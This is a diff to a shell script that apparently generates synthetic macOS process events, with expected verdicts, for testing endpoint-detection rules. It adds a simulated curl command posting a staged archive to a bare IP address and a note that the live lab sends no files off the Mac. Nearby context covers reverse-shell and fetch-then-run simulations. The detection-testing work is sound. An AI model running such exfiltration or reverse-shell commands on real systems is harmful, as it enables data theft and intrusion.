@@ -534,6 +534,13 @@ synthetic_story() {
   run_as 101.1 "$ZSH" 7651 9651 "$LAB/stage2" adhoc stage2-55554944f0be3f1f '' stage2 --run
   answer dropped dropped-then-executed high queued 'stage2 --run' 'A program written by curl runs a second later from the staging folder, and it is ad-hoc signed: fetch, then run.'
 
+  # 13b. The shell posts an archive from the staging folder to a server that is a bare IP address.
+  local up
+  ev_fork 102.0 "$ZSH" 7655 9655; up=$LAST
+  ev_exec 102.1 "$up" /usr/bin/curl platform com.apple.curl '' "$CWD" tty curl -X POST --data-binary "@$LAB/outbox.zip" http://203.0.113.9/log
+  ev_exit 102.6 "$up"
+  answer upload file-upload high queued 'outbox.zip http' 'curl posts an archive from the staging folder to a bare IP address: the staged loot leaves the Mac.'
+
   # 14. A program in the staging folder opens a reverse shell: sh -c wires bash -i to a TCP connection, so bash reads
   #     its commands from a socket.
   local svc sh rbash
@@ -600,6 +607,7 @@ live_answers() {
     '#   credential-store-copy: the lab will not copy the real keychain or a browser'"'"'s password database.' \
     '#   apple-masquerade: the lab will not write a com.apple launch plist, and an unsigned program will not run.' \
     '#   clickfix-paste-chain: the lab will not fetch with curl -k or a custom user agent, or run what it decodes.' \
+    '#   file-upload: the lab will not send a file off the Mac, not even to nowhere; a loopback server is ignored by the rule.' \
     '#   risky-parent-spawn for Script Editor, Office and developer tools: the lab opens none of them (only its applet).' \
     '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' \
     '#   reverse-shell: the lab opens no reverse shell, even to loopback, so endpoint protection is not set off.' >&4
